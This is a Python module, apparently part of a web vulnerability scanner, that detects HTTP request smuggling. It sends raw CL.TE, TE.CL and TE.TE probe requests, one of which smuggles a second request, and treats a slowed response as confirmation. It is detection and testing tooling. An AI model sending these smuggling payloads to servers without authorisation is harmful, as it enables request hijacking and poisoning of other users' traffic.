"""bypass/smuggling v2 — CL.TE/TE.CL/TE.TE with timing-based confirmation.

v1 false positive: "SMUGGLED" in response → our own marker echoed by server 400
page → counted as evidence. WRONG — Apache echoes the request body in error pages.

v2: timing-based. Real CL.TE → backend waits for body → response 5s+ slower than baseline.
"""
import socket
import time
from urllib.parse import urlparse


def _send(host, port, raw, timeout=10):
    t0 = time.time()
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.sendall(raw)
        s.settimeout(timeout)
        buf = b""
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                buf += chunk
        except socket.timeout:
            pass
        s.close()
        return buf.decode("latin1", errors="ignore"), time.time() - t0
    except Exception as e:
        return f"ERROR: {e}", time.time() - t0


class Smuggling:
    def run(self, session, logger):
        u = urlparse(session.target)
        host = u.hostname
        port = u.port or (443 if u.scheme == "https" else 80)
        if u.scheme == "https":
            print("[smuggling v2] TLS not supported in raw socket probe, skipping")
            return {"findings": []}

        # === baseline timing ===
        base_raw = f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n".encode()
        base_resp, base_dt = _send(host, port, base_raw, timeout=6)
        if base_resp.startswith("ERROR"):
            print(f"[smuggling v2] baseline failed: {base_resp}")
            return {"findings": []}
        base_code = base_resp.split()[1] if base_resp else "?"
        print(f"[smuggling v2] baseline: {base_code} {base_dt*1000:.0f}ms")

        probes = {
            "CL.TE": (f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 13\r\n"
                      f"Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED\r\n"),
            "TE.CL": (f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 3\r\n"
                      f"Transfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n"),
            "TE.TE": (f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 4\r\n"
                      f"Transfer-Encoding: chunked\r\nTransfer-Encoding: x\r\n\r\n"
                      f"5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n"),
        }

        findings = []
        threshold = max(base_dt * 3, 3.0)

        for name, probe in probes.items():
            print(f"  probing {name}...")
            resp, dt = _send(host, port, probe, timeout=10)

            # === TIMING check — единственный надёжный сигнал ===
            if dt > threshold:
                print(f"  ✓ {name} TIMING confirmed: {dt:.1f}s vs baseline {base_dt*1000:.0f}ms")
                findings.append({
                    "type": name,
                    "severity": "high",
                    "reason": f"timing {dt:.1f}s > threshold {threshold:.1f}s",
                })
                logger.finding("smuggling", "high",
                               f"{name} (timing {dt:.1f}s vs {base_dt*1000:.0f}ms baseline)")
                continue

            # === 400 both times → not smuggling, just rejection ===
            if "400" in resp:
                print(f"  · {name}: rejected (400), dt={dt:.2f}s → not smuggling")
                continue

            # === our marker echoed = server 400 page — NOT evidence ===
            if "SMUGGLED" in resp:
                print(f"  · {name}: our marker echoed → server error page, not smuggling")
                continue

            print(f"  · {name}: no timing, no 400, no marker — nothing")

        print(f"[smuggling v2] done: {len(findings)}")
        return {"findings": findings}
